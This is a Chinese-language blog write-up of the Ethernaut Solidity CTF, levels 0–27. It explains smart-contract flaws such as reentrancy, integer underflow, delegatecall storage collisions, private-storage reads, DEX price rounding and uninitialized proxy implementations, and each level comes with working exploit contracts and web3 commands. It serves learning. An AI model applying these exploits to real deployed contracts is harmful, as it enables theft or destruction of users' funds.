---
title: "Ethernaut Writeup"
subtitle:    ""
description: ""
date: 2022-08-26
draft: false
author:      "Ashley Hsu"
image:       ""
tags:        ["ethernaut", "CTF", "Solidity"]
categories:  ["CTF" ]
---

[Ethernaut](https://ethernaut.openzeppelin.com/) 是學習區塊鏈及 solidity 非常好的入門學習材料，之前是在 Rinkeby 測試網上，但測試網會陸續關掉，之後可以在 local [部署](https://github.com/OpenZeppelin/ethernaut)。

還是紀錄一下解題🐱

## 事前準備
1. Metamask
2. Remix
3. 測試幣：<https://faucet.paradigm.xyz/>
4. Web3.js 基礎

## 0. Hello Ethernaut
打開 console(F12)，目標讓 `clear = true`。
觀察 `authenticate()` 需傳入 passkey，
```solidity
function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }
```
password 是個 public 變數。
```solidity
string public password;
```

```javascript
await contract.password()
// output: 'ethernaut0'
```
拿到 password 傳入 authenticate()
```javascript
await contract.authenticate('ethernaut0')
```
Level completed.

## 1. Fallback
讓 `owner = player` 且 contract balance = 0

觀察 `receive()` 可以做到，但需繞過條件 msg.value > 0 且 contributions[msg.sender] > 0。
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```
1. contributions[msg.sender] > 0
透過 `contribute()` 達成此條件
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
}
```
2. 送 ether 給合約進入 `receive()`
3. 此時 `owner = player`，onlyOwner 可過，調用 `withdraw()` 可以領全部的錢
```solidity
function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
}
```
### Exploit
```javascript
await contract.contribute({value: toWei("0.00001")});
await contract.send({value: toWei("0.00001")});
await contract.withdraw();
```
確定 balance = 0
```javascript
await getBalance(contract.address);
// output: 0
```
Level completed.

## 2. Fallout
目標 `owner = player`

舊版本 Solidity 合約同名的函數作為 constructor
```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```
### Exploit
直接呼叫 `Fal1out()` 就完事了
```javascript
await contract.Fal1out();
```
Level completed.

## 3. Coin Flip
猜硬幣正反面遊戲，需連續猜對 10 次（不同 block）i.e. `consecutiveWins = 10`

用 block.number 作為隨機數
```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```
每次猜測需在不同 block
```solidity
if (lastHash == blockValue) {
    revert();
}
```
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './SafeMath.sol';

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess(address levelInstance) public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        if (side == true) {
            ICoinFlip(levelInstance).flip(true);
        } 
        else {
            ICoinFlip(levelInstance).flip(false);
        }
    }
}
```
Check `consecutiveWins`
```javascript
await contract.consecutiveWins().then(v => v.toString())
// Output: '10'
```
Level completed.

## 4. Telephone
目標 `owner = player`

了解 tx.origin 與 msg.sender 的差別：
```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```
### 舉例：A->B->C->D 
#### Inside D:
- msg.sender 為 C (sender of the message) 
- tx.origin 為 A (sender of the transaction)

### Exploit
部署一個合約呼叫 `changeOwner()` 即可通過 tx.origin != msg.sender
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {

  function attack(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```
Level completed.

## 5. Token
目標 `balances[player] > 20`，初始 `balances[player] = 20`

觀察 solidity 版本 0.6.0 且沒有 SafeMath（0.8.0 後自帶 SafeMath）

```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```
unit256 範圍為 `0` 到 `2^256 - 1`，所以 Line 2: require 一定會過

任何加法減法都可能會 overflow/underflow
```
20 - 21 = 2^256 - 1
```
所以轉出 21 到別的地址即可

### Exploit
```javascript
await contract.transfer(instance, 21)
```
Level completed.

## 6. Delegation
目標 `owner = player`

注意到 Delegate 合約有個 `pwn()` 可以改 owner:
```solidity
  function pwn() public {
    owner = msg.sender;
  }
```
Delegation 合約的 `fallback()` 可以有個 delegatecall（執行另一個合約的邏輯，狀態是改變現在這個合約）
```solidity
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```
### Exploit
利用 `fallback()` 中的 delegatecall 調用 `pwn()`
```javascript
signature = web3.eth.abi.encodeFunctionSignature("pwn()")
await contract.sendTransaction({ from: player, data: signature })
```
Level completed.

## 7. Force
目標讓合約 balance > 0

可以看到沒 receive 或 fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
送 unexpected ether 最簡單的做法：合約 selfdestruct 並發送 ether 到指定地址

### Exploit
記得先轉 ether 進去再 selfdestruct
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {

  constructor() public payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
```
Level completed.

## 8. Vault
目標 `locked = false`

password 雖然是 private 但還是能透過知道他在哪個 slot 拿到他的值
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
- slot 0: bool public locked;
- slot 1: bytes32 private password;

### Exploit
```javascript
password = await web3.eth.getStorageAt(contract.address, 1)
await contract.unlock(password)
```
Level completed.

## 9. King
目標 `king = player`

必須付比 prize() 更多的 ether 成為新的 king，提交 instance 時要避免 level 再度成為 king
```solidity
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```
line 4 會改變 king，因此需想辦法在 line 3 卡住

### Exploit
不寫 receive 或 fallback，當進到 `king.transfer(msg.value)` 會有 exception
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForeverKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
    }
}
```
Level completed.

## 10. Re-entrancy
目標偷走合約所有的資產

很明顯違反 check-effect-interactions pattern
```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

### Exploit
1. `donate()`
2. `withdraw()`
3. 重入 `withdraw()`，此時 `balances[msg.sender]` 還沒被改變

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    IReentrance target;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        target = IReentrance(_targetAddr);
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        target.donate.value(msg.value)(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(target).balance;
        if (targetBalance >= targetValue) {
          target.withdraw(targetValue);
        }
    }
}
```
Level completed.

## 11. Elevator
目標 `top = true`

需要自己實作 `isLastFloor()`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
第一次呼叫 isLastFloor() 需回傳 false(line 15)，第二次需回傳 true(line 17)
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    IElevator(_victim).goTo(1);
  }
}
```
Level completed.

## 12. Privacy
目標 `locked = false`

得知道 bytes16(data[2]) 是什麼
```solidity
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
```
看一下 storage 的狀況：
```
slot 0: bool
slot 1: ID
slot 2: awkwardness | denomination | flattening
slot 3: data[0]
slot 4: data[1]
slot 5: data[2]
```
### Exploit
```javascript
key = await web3.eth.getStorageAt(contract.address, 5)
// Output: '0x5dd89f7b81030395311dd63330c747fe293140d92dbe7eee1df2a8c233ef8d6d'
// 取 bytes16，記得加上 0x，所以是 34
key = key.slice(0, 34)
// Output: 0x5dd89f7b81030395311dd63330c747fe
await contract.unlock(key)
```
Level completed.

## 13. Gatekeeper One
目標 `entrant = player`

### gateOne
同 4.
```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```
### gateTwo
gasleft 得被 8191 整除
```solidity
  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }
```
可以本地跑看看估算大概多少 gas，搞個 for 在某個區間試試看
```solidity
contract GateKeeperOneGasEstimate {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(uint64(tx.origin));
        for (unit i = _gas; i < _gas + 8191; i++){
            (bool success, ) = address(_gateAddr).call.gas(_gas)(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }
        return success;
    }
}
```
### gateThree
```solidity
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```
舉例 player = 0xac32124edDcE61fFa17167a9c449aDc38fc8AEF4

先看 line 4: `uint32(uint64(_gateKey)) == uint16(tx.origin)`

```
uint32(uint64(key)) = 8f c8 AE F4
uint16(tx.origin) = AE F4

8f c8 AE F4 & 00 00 FF FF = 00 00 AE F4
```
line 3: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)`
```
8f c8 AE F4 == AE F4
8f c8 AE F4 & 00 00 FF FF = 00 00 AE F4
```
line 2: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)`
```
8f c8 AE F4 != c4 49 aD c3 8f c8 AE F4
c4 49 aD c3 8f c8 AE F4 & FF FF FF FF 00 00 FF FF = c4 49 aD c3 00 00 AE F4
```

### Exploit
```solidity
contract Gate {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;
        
        bool succeeded = false;

        for (uint i = _gas; i < _gas + 8191; i++) {
          (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }
        return succeeded;
    }
}
```

## 14. Gatekeeper Two
目標 `entrant = player`

### gateOne
同 4.
### gateTwo
extcodesize(a)： 取得位於地址 a 的程式碼大小
- 小知識：在 constructor 去調用時， extcodesize(a) 會回傳 0，因為尚未完成部署
### gateThree
```solidity
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```
If (X ^ Y = Z) => (Y = X ^ Z)

```solidity
_gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1)
```

### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperTwoInterface {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {

  GatekeeperTwoInterface gatekeeper;

  constructor(address GatekeeperTwoContractAddress) public {
    gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));
    gatekeeper.enter(key);
  }
}
```

## 15. Naught Coin
目標 `balanceOf(player) = 0`

Transfer 有個 10 年的 lock period
```solidity
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
```
NaughtCoin 繼承了 openzeppelin ERC20：利用 approve() + transferFrom()

### Exploit
```javascript
totalBalance = await contract.balanceOf(player).then(v => v.toString())
await contract.approve(player, totalBalance)
await contract.transferFrom(player, contract.address, totalBalance)
```

## 16. Preservation
目標 `owner = player`

觀察 setFirstTime 有個 delegatecall
```solidity
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
```
```solidity
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
仔細看會發現有 storage collision，`storedTime` 跟 `timeZone1Library` 都在 slot 0，可以把 timeZone1Library 改成自己的合約，可以藉由 delegatecall 呼叫自己的合約，並利用 storage collision 改掉 owner。

```
       |  LibraryContract         Preservation          Exploit
----------------------------------------------------------------------
slot 0 |     storedTime   <-   timeZone1Library     timeZone1Library
slot 1 |        _              timeZone2Library     timeZone2Library
slot 2 |        _                   owner                owner
slot 3 |        _                 storedTime
```

### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

```javascript
await contract.setFirstTime(exp)
await contract.setFirstTime(1)
```

## 17. Recovery
目標找到 simpleToken 的 address 並讓他的 ether 歸 0

去 XXXscan 上觀察 address，利用 selfdestruct 將合約的 ether 全數轉出

正規解法要算出 contract address

### Exploit
```solidity
pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Exp {

    function withdraw(address _addr) public {
        ISimpleToken(_addr).destroy(payable(msg.sender));
    }
}
```

## 18. MagicNumber
目標寫出最多只能用到 10 opcodes 的合約，需回傳 magic number 42
### Runtime code
return 42(0x2a)，RETURN 有 2 個參數: position、size，先將 42 存進 memory 再從 memory 讀出來並回傳
- mstore(position, value)
```
602a    Push 0x2a in stack.
6050    Push 0x50 in stack.
52      Mstore
```
- return(position, size)
```
6020    Push 0x20(32 bytes) in stack.
6050    Push 0x50 in stack.
f3      RETURN
```

runtime opcodes 剛好 10 bytes
```
602a60505260206050f3
```

### Init code
可以部署一個合約看看長怎樣

### Exploit
```
bytecode = '600a600c600039600a6000f3602a60505260206050f3'
txn = await web3.eth.sendTransaction({from: player, data: bytecode})
solverAddr = txn.contractAddress
await contract.setSolver(solverAddr)
```

## 19. Alien Codex
目標 `owner = player`

AlienCodex 繼承了 Ownable，owner 必定在 `Ownable-05.sol` 中，storage 從 `Ownable-05.sol` 開始排，storage 總共有 `2^256` 個 slot。

從 slot 0 開始看 owner 到底在哪個 slot

注意 solidity 版本 `0.5.0` -> overflow/underflow?

Dynamic array `codex` 的 `data[0]` 存放在 slot p = keccak256(1)，`data[1]` 在 keccak256(1)+1，以此類推。
```
slot 0:      contact | owner
slot 1:      codex.length
...
slot p:      codex[0]
slot p+1:    codex[1]
... 
slot 2^256-1:codex[2^256 - 1 - p]
slot 0       codex[2^256 - p]
```
看到 `retract()` 可以改變 length，讓 length overflow，又因為總共只有 `2^256` 個 slot，必定存在 `i` 使得 `codex[i]` 存在 slot 0，可以用 `revise()` 改掉在 slot 0 的 owner。
```solidity
  function retract() contacted public {
    codex.length--;
  }
```
### Exploit
```javascript
await contract.make_contact()
await contract.retract()
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
i = BigInt(2 ** 256) - BigInt(p)
content = '0x000000000000000000000000' + player.slice(2)
await contract.revise(i, content)
```

## 20. Denial
目標讓 owner 無法透過 `withdraw()` 成功提款
```solidity
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }
```
line 7 會做 transfer，在 line 6 動手腳，call 無限制 gas 用量，透過重入或其他操作達成 `revert: out of gas exception`。

### Exploit
新版本好像不能這樣搞了
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttack {

    fallback() external payable {
        // consume all the gas
        assert(false);
    }
}
```
or
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {

    fallback() external payable {
        while(true) {}
    }
}
```


設定 parnter 
```javascript
await contract.setWithdrawPartner(exp)
```

## 21. Shop
目標 `price < 100`

與 11. 類似，但 `price()` 有 `view` 屬性，調用 view function，預設使用 staticcall
```
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```
line 4 需回傳 > 100，line 6 需回傳 < 100，可以藉由 `isSold` 的改變判斷

### Exploit
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {

    function price() external view returns (uint) {
        return IShop(msg.sender).isSold() ? 1 : 100;
    }

    function attack(address _shopAddr) external {
        IShop(_shopAddr).buy();
    }
}
```

## 22. DEX
player 有 10 token1 及 10 token2，DEX 有 100 token1 及 100 token2

目標將 DEX 其中一種 token 清０

`swap()` 利用 `get_swap_price()` 為 amount
```solidity
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }
```
`get_swap_price()` 直接用 balance 相除計算，可能會有誤差（3/2=1)
```solidity
  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```


### Exploit
```
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)
```

## 23. Dex Two
榨乾 DEX 的 token1 及 token2

與 22. 相比，`swap()` 缺少一行：
```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```
所以拿別的 token 做 swap 就完事了

### Exploit
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract EvilToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
        _mint(msg.sender, initialSupply);
    }
}
```
```javascript
await contract.swap(evlToken1, t1, 100)
await contract.swap(evlToken2, t2, 100)
```

## 24. Puzzle Wallet
目標 `admin = player`

有難度的一題，幾個觀察：
1. `approveNewAdmin()` 可改 admin，但有 modifier `onlyAdmin`，此路行不通
2. PuzzleWallet 每個 function 都有 modifier `onlyWhitelisted`，owner 可以加白名單
3. PuzzleProxy 的 `pendingAdmin` 跟 PuzzleWallet 的 `owner` 共用同一個 slot 0
4. `maxBalance` 跟 `admin` 都在 slot 1

透過更改 `pendingAdmin` 達成改 `owner`，成為 `owner` 後加白名單，改 `maxBalance` 為 `player`，`admin` 即為 `player`。

`setMaxBalance()` 卡了一個 `address(this).balance == 0` 要繞過
```solidity
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```
先確定一下 balance
```javascript
await getBalance(contract.address)
// Output: 0.001
```
思考在同一個交易調用2次 `deposit()`，因為 `multicall()` 共用一個 `msg.value`，這樣可以只轉一筆 ether 但 balance 會是2倍。

注意到 `multicall()` line 9 限制 deposit 只能 call 一次 
```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```
繞過 line 9: 在 multicall 裡面包 2 multicall，裡面分別調用 deposit()

原本想法：
```
multicall -> deposit
          -> deposit
```
變成：
```
multicall -> multicall -> deposit
          -> multicall -> deposit
```

### Exploit
1. 調用 `proposeNewAdmin()`
```javascript
Signature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
params = [player]
data = web3.eth.abi.encodeFunctionCall(Signature, params)
await web3.eth.sendTransaction({from: player, to: instance, data})
```
2. 調用 `addToWhitelist()`
3. 利用 multicall `deposit()` twice
4. `execute()` 領錢
5. `setMaxBalance()` 設為 `player`
```javascript
await contract.addToWhitelist(player)
depositData = await contract.methods["deposit()"].request().then(v => v.data)
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
await contract.execute(player, toWei('0.002'), 0x0)
await contract.setMaxBalance(player)
```
## 25. Motorbike

selfdestruct the engine

### EIP-1967 
- Standard Proxy Storage Slots
- implementation 和 admin，分别存邏輯合約地址和管理員地址
- 如果放在 slot 0、slot 1，可能會有 storage collision 的問題
- EIP-1967 提出把 implementation 和 admin 放在了兩個特殊的 slot 中
```solidity
// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```

Engine 合約中無 `selfdestruct`，但 `_upgradeToAndCall()` 中有個 delegatecall，可以透過他呼叫 selfdestruct。

先找一下 engine 合約的地址，存在 slot _IMPLEMENTATION_SLOT 中：
```javascript
Addr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
```
原則上 engine 只負責邏輯，因此應當沒有被初始化過，可調用 `initialize()` 做初始化。
接著 `upgradeToAndCall()`，完成 selfdestruct。

### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;
import "@openzeppelin/contracts/utils/Address.sol";

contract MotorbikeAttack {

    // Address of current implementation (The Engine)
    address public implementation;
    event Check(bool result);

    constructor(address impl) public {
        implementation = impl;
    }

    function takeControl() external returns(bytes memory) {
        // take control over the Engine
        Address.functionCall(implementation, abi.encodeWithSignature("initialize()"));
    }
    
    function destroy() external {
        // Upgrade the engine to a contract that selfdestruct once initialized
        Exploit exploit = new Exploit();

        Address.functionCall(
           implementation, 
           abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(exploit),
            abi.encodeWithSignature("initialize()")
           )
        );
    }

    function validateItIsBroken() external {
        emit Check(Address.isContract(implementation));
    }
    
}

contract Exploit {

    function initialize() external {
        selfdestruct(msg.sender);
    }
}
```

## 26. Double Entry Point
自己寫個 forta bot

需實作 `handleTransaction()` 
### Exploit
```solidity
pragma solidity ^0.8.0;

interface IForta {
    function raiseAlert(address user) external;
}

contract MyDetectionBot {
    
    function handleTransaction(address user, bytes calldata msgData) external {
        IForta(msg.sender).raiseAlert(user);
    }
}
```
設定 bot
```javascript
botAddr = '0x...'
forta = await contract.forta()
setBotSig = web3.eth.abi.encodeFunctionCall({
    name: 'setDetectionBot',
    type: 'function',
    inputs: [
        { type: 'address', name: 'detectionBotAddress' }
    ]
}, [botAddr])

await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })
```
## 27. Good Samaritan
清空 wallet 的 balance

一直 request 顯然不是正解

`tarnsfer()` 會進 `notify()`，`dest_` 可以自行指定，可能可以做一些事
```solidity
if(dest_.isContract()) {
    // notify contract 
    INotifyable(dest_).notify(amount_);
}
```
line 8 把錢全部轉給 `msg.sender`，cool，這就是我們要的，於是在 notify 裡面寫個 err `NotEnoughBalance()` 就行。
```solidity
function requestDonation() external returns(bool enoughBalance){
    // donate 10 coins to requester
    try wallet.donate10(msg.sender) {
        return true;
    } catch (bytes memory err) {
        if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
            // send the coins left
            wallet.transferRemainder(msg.sender);
            return false;
        }
    }
}
```

### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GoodSamaritan.sol";

error NotEnoughBalance();

contract GoodSamaritanAttack {

  function attack(address _goodSamaritan) external {
    GoodSamaritan(_goodSamaritan).requestDonation();
  }

  function notify(uint256 amount_) external pure {
    if(amount_ <= 10) {
      revert NotEnoughBalance();
    }
  }
}
```